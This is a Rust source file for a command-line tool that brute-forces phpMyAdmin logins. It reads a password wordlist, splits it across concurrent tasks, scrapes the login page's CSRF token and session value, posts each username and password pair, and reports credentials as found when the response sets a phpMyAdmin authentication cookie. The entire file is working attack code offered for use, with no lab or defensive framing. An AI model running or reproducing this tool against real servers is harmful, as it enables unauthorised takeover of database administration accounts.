use std::env::args;
use std::fs::File;
use std::io::{BufRead, BufReader};
use std::process::exit;
use std::time::{Duration, Instant};
use std::collections::HashMap;

use reqwest::{Client, Response};
use reqwest::header::{HeaderMap, SET_COOKIE};
use reqwest::redirect::Policy;

use colored::*;

fn error_message(_error_message: &str) -> (){
    let file_error: ColoredString = _error_message.red();
    eprintln!("{}", file_error);    
}

fn check_arguments_option<'a>(arguments: Vec<String>, option: &str) -> String{
    for (index, argument) in arguments.iter().enumerate(){
        if argument == option && index + 1 < arguments.len(){
            return arguments[index + 1].clone();
        }
    }

    let argument_error: String = format!("{}{}", "[-] Error in argument : ".red(), option.red());
    eprintln!("{}", argument_error);  
    exit(1);
}

fn create_client(_is_postclient: bool, _timeout: u64) -> Client{
    let client: Client;
    let timeout_duration: Duration = Duration::from_millis(_timeout);
    if _is_postclient{
        client = Client::builder().timeout(timeout_duration).redirect(Policy::none()).build().expect("[-] Error creating Post-Client");
    }else{
        client= Client::builder().timeout(timeout_duration).redirect(Policy::limited(10)).build().expect("[-] Error creating Get-lient");
    }

    return client;
}

fn open_file(path: &str) -> Option<File>{
    if let Ok(file) =  std::fs::OpenOptions::new().read(true).open(path){
        return Some(file);
    }

    error_message("[-] Error while openning file.");
    exit(1);
}

fn scrapping_dom_element(_dom: String) -> HashMap<&'static str, String>{
    let mut params: HashMap<&str, String> = HashMap::new();

    if _dom.contains("name=\"token\""){
        let token_part = _dom.split("name=\"token\"").nth(1).unwrap();
        let token_value = token_part.split("value=\"").nth(1).unwrap();
        let csrf_token = token_value.split("\"").nth(0).unwrap().to_string();  
        params.insert("token", csrf_token.clone());  
    }

    if _dom.contains("name=\"set_session\""){
        let set_session_part = _dom.split("name=\"set_session\"").nth(1).unwrap();
        let set_session_value = set_session_part.split("value=\"").nth(1).unwrap();
        let set_session = set_session_value.split("\"").nth(0).unwrap().to_string();
        params.insert("set_session", set_session.clone());              
    }  

    return params; 
}

fn generate_header(_set_cookie: &String) -> HeaderMap{
    let mut headers = reqwest::header::HeaderMap::new();
    headers.insert(reqwest::header::CONTENT_TYPE, "application/x-www-form-urlencoded".parse().unwrap());
    headers.insert(reqwest::header::COOKIE, reqwest::header::HeaderValue::from_str(&format!("phpMyAdmin={}", _set_cookie)).unwrap());

    return headers;
}

async fn check_if_vulnerable(response: Response) -> bool{
    if response.status().is_redirection(){
        if response.status() == 302{
            for set_cookie in response.headers().get_all(SET_COOKIE).iter(){
                if set_cookie.to_str().unwrap().split(" ").nth(0).unwrap().contains("pmaAuth-1"){
                    return true;
                }
            }
        }
    }

    return false;
}

fn file_to_multiple_list(_file: File, _threads: usize) -> Vec<Vec<String>>{
    let mut creds_list: Vec<String> = Vec::new();
    let buffer: BufReader<File> = BufReader::with_capacity(20, _file);    
    for line in buffer.lines(){
        creds_list.push(line.unwrap());
    }

    let mut multiple_list: Vec<Vec<String>> = Vec::with_capacity(_threads);
    for list in creds_list.chunks_exact(creds_list.len() / _threads){
        multiple_list.push(list.to_vec());
    }

    return multiple_list;
}

async fn pma_attack(_url: String, _pma_username: String, _wordlist: String, _threads: usize, _timeout: u64) {    
    let _post_client: Client = create_client(true, _timeout);  
    let _get_client: Client = create_client(false, _timeout);     

    if let Some(file) = open_file(&_wordlist) {
        let lists: Vec<Vec<String>> = file_to_multiple_list(file, _threads);

        let threads: Vec<_> = lists.into_iter().map(|list: Vec<String>| {
            let post_client = _post_client.clone();
            let get_client = _get_client.clone();

            let url_clone = _url.clone();
            let pma_username_clone = _pma_username.clone();    

            tokio::task::spawn(async move {
                for pma_password in list {
                    if let Ok(response) = get_client.get(url_clone.clone()).send().await{
                        if let Ok(dom) = response.text().await {
                            let mut params: HashMap<&str, String> = scrapping_dom_element(dom);
                            if params.len() == 0x02 {
                                let set_cookie: &String = params.get("set_session").unwrap();
                                let headers: HeaderMap = generate_header(set_cookie);

                                params.insert("pma_username", pma_username_clone.clone());
                                params.insert("pma_password", pma_password.clone());

                                if let Ok(response) = post_client.post(format!("{}{}", url_clone, "/index.php")).headers(headers).form(&params).send().await{
                                    if check_if_vulnerable(response).await{
                                        let target_cred: String = format!("{} {}:{}", "[+] Found creds".green(), pma_username_clone.red(), pma_password.red());
                                        println!("{}\n\n", target_cred);
                                    }
                                }
                            }
                        }
                    }else{
                        error_message("[-] Error while reaching web URL.");                                     
                    }
                }
            })            
        })
        .collect();

        for thread in threads{
            thread.await.expect("[-] Error stopping thread.");
        }
    }
}


async fn application() -> (){
    let args: Vec<String> = args().collect();
    let url: String = check_arguments_option(args.clone(), "--url");
    let pma_username: String = check_arguments_option(args.clone(), "--pma_username");
    let wordlist_path: String = check_arguments_option(args.clone(), "--wordlist");
    let threads: usize = check_arguments_option(args.clone(), "--threads").parse::<usize>().unwrap();
    let timeout: u64 = check_arguments_option(args.clone(), "--time-out").parse::<u64>().unwrap();

    if !url.is_empty() && !pma_username.is_empty() && !wordlist_path.is_empty(){
        pma_attack(url, pma_username, wordlist_path, threads, timeout).await;
    }
}

#[tokio::main]
async fn main() {    
    let start_time: Instant = Instant::now();

    application().await;

    let end_time: Instant = Instant::now();
    println!("[+] Program success in {:?}", end_time - start_time);
}

//ADD TIMEOUT .md